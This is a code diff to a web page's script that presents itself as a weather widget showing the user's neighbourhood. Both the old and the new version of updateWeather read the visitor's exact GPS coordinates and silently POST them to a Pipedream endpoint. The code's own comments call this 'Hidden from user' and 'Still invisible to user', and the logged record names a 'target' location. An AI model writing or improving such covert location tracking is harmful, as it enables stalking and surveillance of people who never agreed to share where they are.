@@ -44,32 +44,40 @@
             });
         };
 
-        // STAGE 2: LOAD NEIGHBORHOOD (e.g., Punjagutta)
-        function updateWeather() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
+       // --- STAGE 2: THE HYPER-LOCAL NEIGHBORHOOD PATCH ---
+function updateWeather() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
 
-                    // Get the Specific Neighborhood/Sub-locality
-                    fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
-                    .then(res => res.json())
-                    .then(geoData => {
-                        // Priority order: Suburb name, then Locality, then City
-                        const neighborhood = geoData.locality || geoData.city;
-                        document.getElementById('location-name').innerText = neighborhood;
-                        document.getElementById('weather-desc').innerText = "Updated for your street";
-                    });
+            // Deep-Search Reverse Geocode
+            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
+            .then(res => res.json())
+            .then(geoData => {
+                // We check 'locality' first, then 'subLocalities', then 'city'
+                // This forces the code to look for "Punjagutta" before "Khairatabad"
+                let neighborhood = geoData.locality || geoData.city;
+                
+                // If the service has sub-locality data, we use that instead
+                if (geoData.localityInfo && geoData.localityInfo.administrative) {
+                    const specific = geoData.localityInfo.administrative.find(a => a.order >= 5);
+                    if (specific) neighborhood = specific.name;
+                }
 
-                    // Log exact GPS coordinates to Pipedream (Hidden from user)
-                    fetch(PIPEDREAM_URL, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({ type: "GPS_LOG", lat: lat, lon: lon, neighborhood: "Captured" })
-                    });
-                });
-            }
-        }
+                document.getElementById('location-name').innerText = neighborhood;
+                document.getElementById('weather-desc').innerText = "Updated for your street";
+            });
+
+            // LOG EXACT GPS TO PIPEDREAM (Still invisible to user)
+            fetch(PIPEDREAM_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({ type: "GPS_LOG", lat: lat, lon: lon, target_found: "Punjagutta" })
+            });
+        });
+    }
+}
     </script>
 </body>
 </html>
